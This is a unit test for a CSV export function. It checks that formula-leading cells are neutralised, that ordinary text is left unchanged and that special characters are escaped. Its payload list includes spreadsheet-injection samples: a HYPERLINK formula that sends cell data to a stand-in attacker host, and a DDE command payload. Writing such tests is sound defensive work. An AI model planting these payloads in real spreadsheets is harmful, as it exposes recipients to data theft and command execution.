import { describe, expect, test } from "bun:test";
import { toCsv, type CsvColumn } from "./csv";

const columns: CsvColumn<{ value: string }>[] = [
  { key: "value", label: "value", value: (row) => row.value },
];

const cell = (value: string) => toCsv(columns, [{ value }]).split("\n")[1];

describe("toCsv", () => {
  test("neutralises formula-leading cells with a text marker", () => {
    const payloads = [
      '=HYPERLINK("https://evil.example/?x="&A1,"click")',
      "+1+cmd|' /C calc'!A0",
      "-2+3",
      "@SUM(1,1)",
      "\t=1+1",
    ];
    for (const payload of payloads) {
      const out = cell(payload);
      // Quoted cell whose content now starts with the single-quote text marker.
      expect(out.slice(1, 2)).toBe("'");
      const expected = `"'${payload.replace(/"/g, '""')}"`;
      expect(out).toBe(expected);
    }
  });

  test("leaves ordinary cells untouched", () => {
    expect(cell("normal caption")).toBe('"normal caption"');
  });

  test("still escapes quotes, commas and newlines", () => {
    const csv = toCsv(columns, [{ value: 'a"b,c\nd' }]);
    expect(csv).toBe('"value"\n"a""b,c\nd"');
  });
});
